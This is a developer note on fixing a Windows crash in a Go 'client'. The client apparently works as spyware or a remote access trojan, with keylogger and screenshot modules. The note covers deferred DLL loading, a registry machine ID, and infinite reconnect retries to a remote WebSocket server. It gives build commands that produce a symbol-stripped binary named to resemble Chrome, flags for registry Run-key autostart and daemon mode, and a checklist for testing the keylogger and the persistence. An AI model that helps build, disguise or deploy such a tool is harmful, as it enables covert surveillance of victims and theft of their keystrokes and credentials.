# Windows Client Crash Fix

## Problem
Client crashed immediately on Windows with:
```
Exception 0xc0000005 0x8 0x0 0x0
PC=0x0
```

## Root Cause
- Windows DLL initialization at package init time caused null pointer dereference
- `syscall.NewLazyDLL()` and `.NewProc()` were called at global var declaration
- DLLs were accessed before proper initialization

## Solution Applied

### 1. Deferred DLL Loading
**Files Modified:**
- `client/keylogger_windows.go`
- `client/screenshot_windows.go`

**Changes:**
- Moved DLL/proc declarations from package init to lazy initialization functions
- Added `initKeyloggerDLLs()` and `initScreenshotDLLs()` called on first use
- Prevents crashes from DLL loading before runtime initialization

### 2. Graceful Startup Failures
**File Modified:**
- `client/main.go`

**Changes:**
- Added fallback machine ID generation (no fatal exit)
- Replaced `log.Fatalf()` with retry loop on connection failure
- Client now retries every 10 seconds instead of exiting

### 3. Windows-Specific Machine ID
**File Created:**
- `client/machine_id_windows.go`

**Changes:**
- Reads `MachineGuid` from Windows registry
- Proper build tags to separate platform implementations

## Build Commands

### Windows 64-bit
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o bin/chrom-win64.exe ./cmd/client
```

### Windows 32-bit
```bash
GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o bin/chrom-win32.exe ./cmd/client
```

### Without Screenshot Support (lighter binary)
```bash
GOOS=windows GOARCH=amd64 go build -tags noscreenshot -ldflags="-s -w" -o bin/chrom-win64.exe ./cmd/client
```

## Usage Examples

### Run in foreground (for testing)
```powershell
.\chrom-win64.exe -server wss://yourserver.com/ws
```

### Run with auto-start enabled
```powershell
.\chrom-win64.exe -server wss://yourserver.com/ws -autostart
```

### Run as daemon (background)
```powershell
.\chrom-win64.exe -server wss://yourserver.com/ws -daemon
```

### Disable daemon mode explicitly
```powershell
.\chrom-win64.exe -server wss://yourserver.com/ws -daemon=false
```

## Testing Checklist

1. **Basic Execution**: Run without flags - should retry connection every 10s
2. **Machine ID**: Check `%APPDATA%\ServerManagerClient\machine-id` created
3. **Logs**: When running with `-daemon`, check `client.log` in current directory
4. **Screenshot**: Test screenshot capture (requires GUI session)
5. **Keylogger**: Test keylogger (requires admin privileges)
6. **Auto-start**: Verify registry entry at `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

## Known Limitations

- Keylogger requires administrator privileges on Windows
- Screenshot capture doesn't work in Windows Core/headless
- TLS certificate verification enabled (use valid certs or adjust for testing)

## Development Notes

- All Windows syscalls now use lazy loading pattern
- DLL initialization happens on first method call, not package import
- Client automatically retries failed connections indefinitely
- Machine ID is stable across reboots (cached + registry-based)
